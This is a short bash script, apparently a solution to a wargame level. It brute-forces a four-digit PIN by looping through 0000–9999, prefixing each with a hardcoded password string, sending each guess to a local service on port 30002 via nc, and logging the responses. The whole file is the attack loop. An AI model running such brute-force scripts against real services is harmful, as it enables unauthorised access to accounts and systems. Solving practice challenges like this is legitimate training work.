combo=$(echo {0..9}{0..9}{0..9}{0..9})
combo_arr=($combo)
for i in $(seq $1 9999); do
	passw=$(echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' ${combo_arr[$i]})
	echo 'attempting ' $passw 
	echo $passw >> outp.txt
	attempt=$(nc -q 2 localhost 30002 <<< $passw)
	echo $attempt >> outp.txt
done
